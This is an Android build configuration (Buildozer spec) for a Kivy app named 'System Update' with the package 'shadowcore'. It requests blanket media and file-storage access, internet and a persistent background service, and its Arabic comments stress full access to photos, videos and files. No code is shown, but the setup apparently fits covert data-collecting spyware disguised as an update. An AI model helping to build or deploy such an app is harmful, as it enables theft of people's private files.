[app]
title = System Update
package.name = shadowcore
package.domain = org.test

source.dir = .
# إضافة الامتدادات المطلوبة لضمان تضمين كل الملفات
source.include_exts = py,png,jpg,kv,atlas,ini

version = 2.1.0

# المكتبات المطلوبة لعمل الشبكة والصلاحيات
requirements = python3,kivy,pyjnius,requests,certifi,urllib3,idna,charset-normalizer

orientation = portrait

# الأذونات المعدلة للوصول الشامل للصور والفيديوهات والملفات
android.permissions = INTERNET, FOREGROUND_SERVICE, WAKE_LOCK, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, MANAGE_EXTERNAL_STORAGE

# استهداف أحدث الأنظمة
android.api = 33
android.minapi = 21

# تعريف الخدمة (تأكد أن الاسم Myservice مطابق للكود في main.py)
services = Myservice:service.py

# إعدادات التشغيل الدائم في الخلفية
android.foreground_service = True
android.wakelock = True

# ميزات إضافية لضمان استقرار التطبيق
android.enable_androidx = True
android.copy_libs = 1
android.archs = arm64-v8a, armeabi-v7a

[buildozer]
log_level = 2
warn_on_root = 1
